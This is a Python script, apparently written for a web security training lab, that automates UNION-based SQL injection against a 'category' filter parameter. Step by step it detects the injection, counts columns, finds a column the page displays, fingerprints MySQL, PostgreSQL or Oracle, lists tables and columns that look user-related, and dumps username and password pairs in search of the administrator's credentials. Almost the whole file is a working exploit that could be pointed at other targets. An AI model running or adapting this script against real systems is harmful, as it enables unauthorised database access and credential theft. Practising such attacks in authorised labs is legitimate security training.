import re
import requests
from typing import List, Optional, Tuple

BASE_URL = "https://0a7f00c803add5bb801f12e600cc00b0.web-security-academy.net/filter"
PARAM_NAME = "category"
TIMEOUT = 10  # 秒

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (SQLi Tester)"
})

COMMENT = "-- "  # Oracle/PostgreSQL/MySQL 都可用（Oracle 需要尾端空白，所以保留空白）

def send_request(payload: str) -> Optional[requests.Response]:
    try:
        return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def detect_sqli() -> bool:
    normal_payload = "Gifts"
    sqli_payload = f"' OR 1=1 {COMMENT}"
    normal_resp = send_request(normal_payload)
    sqli_resp = send_request(sqli_payload)
    if not normal_resp or not sqli_resp:
        print("[!] 無法取得測試回應")
        return False
    print(f"[+] Normal: {normal_resp.status_code}, len={len(normal_resp.text)}")
    print(f"[+] SQLi  : {sqli_resp.status_code}, len={len(sqli_resp.text)}")
    if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
        print("[*] 可能存在 SQLi（以回應長度判斷）")
        return True
    print("[*] 未偵測到明顯 SQLi（以回應長度判斷）")
    return False

def find_columns(max_columns: int = 20) -> Optional[int]:
    # 以 UNION SELECT NULL, NULL… 方式試探欄位數
    for num in range(1, max_columns + 1):
        payload = "' UNION SELECT " + ",".join(["NULL"] * num) + f" {COMMENT}"
        resp = send_request(payload)
        if not resp:
            continue
        if resp.status_code == 200 and "error" not in resp.text.lower():
            print(f"[+] 可能欄位數 = {num}")
            return num
        else:
            print(f"[-] 測試 {num} 欄位失敗（狀態碼 {resp.status_code}）")
    print("[!] 未能在範圍內找到欄位數")
    return None

def find_display_column(num_cols: int) -> Optional[int]:
    # 將某一欄置入可辨識字串，確認是否可回顯
    for i in range(1, num_cols + 1):
        vals = ["NULL"] * num_cols
        vals[i - 1] = "'DISP_COL_TEST_123'"
        payload = f"' UNION SELECT {','.join(vals)}{COMMENT}"
        resp = send_request(payload)
        if resp and "DISP_COL_TEST_123" in resp.text:
            print(f"[+] 可顯示資料的欄位索引 = {i}")
            return i
    print("[!] 尚未找到可顯示資料的欄位")
    return None

def build_union(num_cols: int, disp_idx: int, expression: str, tail_from: str = "") -> str:
    """
    在 disp_idx 放入目標 expression，其餘補 NULL。
    若需要 FROM 子句（如 Oracle 查 v$version），用 tail_from 帶入 ' FROM ...'
    """
    vals = ["NULL"] * num_cols
    vals[disp_idx - 1] = expression
    if tail_from:
        return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"
    else:
        return f"' UNION SELECT {','.join(vals)} {COMMENT}"

def try_detect_dbms(num_cols: int, disp_idx: int) -> Tuple[Optional[str], Optional[str]]:
    """
    回傳 (dbms, raw_version_text)
    dbms ∈ {'mysql','postgres','oracle'} or None
    """
    # MySQL: @@version
    mysql_payload = build_union(num_cols, disp_idx, "@@version")
    r = send_request(mysql_payload)
    if r and r.status_code == 200 and re.search(r"(?i)mariadb|mysql|innodb|percona|xtradb", r.text):
        print("[+] 偵測到 MySQL/MariaDB")
        return "mysql", r.text

    # PostgreSQL: version()
    pg_payload = build_union(num_cols, disp_idx, "version()")
    r = send_request(pg_payload)
    if r and r.status_code == 200 and re.search(r"(?i)postgresql|on x86_64|gcc", r.text):
        print("[+] 偵測到 PostgreSQL")
        return "postgres", r.text

    # Oracle: v$version.banner
    oracle_payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
    r = send_request(oracle_payload)
    if r and r.status_code == 200 and re.search(r"(?i)oracle\s+database|oracle corporation", r.text):
        print("[+] 偵測到 Oracle")
        return "oracle", r.text

    print("[!] 無法可靠判斷 DBMS（可能被 WAF 過濾或不是 UNION 型）")
    return None, None

import re

def dump_version(num_cols: int, disp_idx: int, dbms: str):
    if dbms == "mysql":
        payload = build_union(num_cols, disp_idx, "@@version")
    elif dbms == "postgres":
        payload = build_union(num_cols, disp_idx, "version()")
    elif dbms == "oracle":
        payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
    else:
        print("[!] 未知 DBMS，略過版本輸出")
        return

    r = send_request(payload)
    if not r or r.status_code != 200:
        print("[-] 無法取得版本資訊")
        return

    # 嘗試抽取版本字串
    version_patterns = [
        r"\d+\.\d+\.\d+[^<\s]*",   # e.g. 8.0.30, 12.1.0.2.0, 13.3
        r"PostgreSQL\s[\d\.]+",    # e.g. PostgreSQL 13.3
        r"Oracle\sDatabase\s[^<\s]+" # e.g. Oracle Database 19c
    ]
    for pat in version_patterns:
        match = re.search(pat, r.text, re.IGNORECASE)
        if match:
            print(f"[+] DB Version: {match.group(0)}")
            return

    # fallback → 沒找到就輸出前幾百字 debug
    print("[?] 無法準確抽取版本字串，回應片段：")
    print(r.text[:300])


def list_user_like_tables(num_cols: int, disp_idx: int, dbms: str) -> List[str]:
    """
    回傳可能與 user 相關的表名清單（粗糙從 HTML 反頁面擷取）
    """
    if dbms == "mysql":
        expr = "table_name"
        tail = (" FROM information_schema.tables "
                "WHERE LOWER(table_name) LIKE '%user%' "
                "AND table_schema NOT IN ('information_schema','mysql','performance_schema','sys')")
    elif dbms == "postgres":
        expr = "table_name"
        tail = (" FROM information_schema.tables "
                "WHERE LOWER(table_name) LIKE '%user%' "
                "AND table_schema NOT IN ('information_schema','pg_catalog')")
    elif dbms == "oracle":
        expr = "table_name"
        tail = (" FROM all_tables "
                "WHERE LOWER(table_name) LIKE '%user%'")
    else:
        print("[!] 未知 DBMS，略過抓表")
        return []

    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    tables = []
    if r and r.status_code == 200:
        print("[+] 回應中嘗試抓取 user-like 表名…")
        # 最簡單粗略法：撈出像表名的 token
        # 1) 抓單字母/數字/底線構成的片段
        candidates = set(re.findall(r"\b[a-zA-Z0-9_]{3,}\b", r.text))
        for c in candidates:
            if "user" in c.lower():
                tables.append(c)
        tables = sorted(set(tables))
        print(f"[+] 可能表名：{tables}")
    return tables

def list_columns(num_cols: int, disp_idx: int, dbms: str, table: str) -> List[str]:
    if dbms in ("mysql", "postgres"):
        expr = "column_name"
        tail = (f" FROM information_schema.columns "
                f"WHERE table_name='{table}'")
    elif dbms == "oracle":
        expr = "column_name"
        # Oracle 資料字典表名/欄位名預設大寫
        tail = (f" FROM all_tab_columns WHERE table_name='{table.upper()}'")
    else:
        return []

    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    cols = []
    if r and r.status_code == 200:
        # 抽欄位名（英數與底線）
        cols = sorted(set(re.findall(r"\b[a-zA-Z0-9_]{2,}\b", r.text)))
        # 嘗試過濾雜訊，只保留看起來像欄位名的 token
        # 以存在 table 名稱的頁面為基底，這裡先不做過度過濾
    print(f"[+] {table} 欄位（猜測）：{cols}")
    return cols

def dump_credentials(num_cols: int, disp_idx: int, dbms: str,
                     table: str, user_col: str, pass_col: str):
    if dbms == "mysql":
        expr = f"concat({user_col}, ':', {pass_col})"
        tail = f" FROM {table}"
    elif dbms == "postgres":
        expr = f"({user_col}::text || ':' || {pass_col}::text)"
        tail = f" FROM {table}"
    elif dbms == "oracle":
        expr = f"({user_col} || ':' || {pass_col})"
        tail = f" FROM {table.upper()}"
    else:
        print("[!] 未知 DBMS，略過 dump")
        return

    payload = build_union(num_cols, disp_idx, expr, tail)
    r = send_request(payload)
    if not r or r.status_code != 200:
        print(f"[-] 從 {table} dump 失敗")
        return

    # 嘗試找出形如 user:pass 的字串
    creds = re.findall(r"([a-zA-Z0-9_\.\-@]+):([^\s<>'\"]+)", r.text)
    found = False
    for u, p in creds:
        if u.lower() == "administrator":
            print(f"[+] 找到 administrator 帳密 → {u}:{p}")
            found = True
    if not found:
        print(f"[-] {table} 中未找到 administrator 資料（共擷取 {len(creds)} 筆）")


def guess_user_pass_columns(columns: List[str]) -> Tuple[Optional[str], Optional[str]]:
    # 常見命名關鍵字：user, username, login, email, mail；pass, password, passwd, hash
    user_keys = ["username", "user_name", "user", "login", "email", "mail"]
    pass_keys = ["password", "passwd", "pass", "pwd", "hash"]
    lc = [c.lower() for c in columns]
    user_col = None
    pass_col = None
    for key in user_keys:
        for i, c in enumerate(lc):
            if key == c or (key in c and len(c) <= 32):
                user_col = columns[i]
                break
        if user_col:
            break
    for key in pass_keys:
        for i, c in enumerate(lc):
            if key == c or (key in c and len(c) <= 32):
                pass_col = columns[i]
                break
        if pass_col:
            break
    return user_col, pass_col

if __name__ == "__main__":
    print("[*] 開始檢測 SQLi…")
    if not detect_sqli():
        exit(0)

    print("[*] 嘗試推測欄位數…")
    col_cnt = find_columns()
    if not col_cnt:
        exit(0)

    print("[*] 嘗試尋找可顯示的欄位…")
    disp_idx = find_display_column(col_cnt)
    if not disp_idx:
        exit(0)

    print("[*] 嘗試判斷後端 DBMS 與版本…")
    dbms, raw_version = try_detect_dbms(col_cnt, disp_idx)
    if not dbms:
        print("[!] 無法判斷 DBMS，仍可嘗試以 MySQL 語法強行列舉（可能失敗）")
        dbms = "mysql"
    dump_version(col_cnt, disp_idx, dbms)

    print("[*] 尋找與 user 相關的資料表…")
    tables = list_user_like_tables(col_cnt, disp_idx, dbms)
    if not tables:
        print("[!] 沒有在頁面中辨識到 user-like 表名（可能是解析失敗或要換關鍵字）")

    for t in tables:
        print(f"[*] 解析 {t} 欄位…")
        cols = list_columns(col_cnt, disp_idx, dbms, t)
        if not cols:
            continue
        ucol, pcol = guess_user_pass_columns(cols)
        if ucol and pcol:
            print(f"[+] 嘗試從 {t} 以 {ucol}/{pcol} 進行 dump")
            dump_credentials(col_cnt, disp_idx, dbms, t, ucol, pcol)
        else:
            print(f"[-] 在 {t} 未找到明顯 user/pass 欄位（columns: {cols[:20]}…）")
